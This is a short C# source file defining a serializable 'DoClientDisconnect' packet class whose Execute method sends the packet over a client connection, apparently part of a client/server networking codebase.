using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoClientDisconnect : IPacket
    {
        public DoClientDisconnect()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}